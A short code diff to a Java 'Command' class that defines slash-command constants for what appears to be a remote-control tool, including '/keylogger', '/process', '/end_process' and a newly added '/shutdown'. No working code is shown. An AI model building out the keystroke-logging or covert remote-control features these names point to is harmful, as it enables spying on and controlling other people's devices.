@@ -15,5 +15,7 @@ public class Command {
     public static final String COMMAND_KEYLOGGER = "/keylogger";
     public static final String COMMAND_PROCESS = "/process";
     public static final String COMMAND_END_PROCESS = "/end_process";
-    public static final String COMMAND_NORMAL = "/normal";
+    public static final String COMMAND_DO_NOTHING = "/do_nothing";
+    public static final String COMMAND_NOTIFICATION = "/notification";
+    public static final String COMMAND_SHUTDOWN = "/shutdown";
 }
